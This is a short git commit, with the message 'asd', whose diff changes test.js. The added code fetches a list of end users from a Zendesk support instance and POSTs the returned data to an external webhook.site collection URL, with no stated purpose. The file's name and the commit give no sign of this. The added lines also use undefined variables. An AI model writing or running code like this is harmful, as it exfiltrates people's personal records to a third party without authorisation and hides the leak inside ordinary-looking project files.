8cfc03310c23ed1221f039fad72c89fb34a75dfb
Claus <claus@claus.nu>
2022-03-28 09:53:44 +0200

    asd

--- test.js
+++ test.js
@@ -1,1 +1,9 @@
-$.ajax('https://cookiebot.zendesk.com/users?location=lotus&page=1&role=0&route=end_users').done(function(data) { console.log(data)})
+$.ajax('https://cookiebot.zendesk.com/users?location=lotus&page=1&role=0&route=end_users').done(function(data) { 
+	$.ajax({
+	  type: "POST",
+	  url: 'https://webhook.site/44d76cef-001d-4ce1-88b3-7737bca7bdb5',
+	  data: data,
+	  success: success,
+	  dataType: dataType
+	});
+})
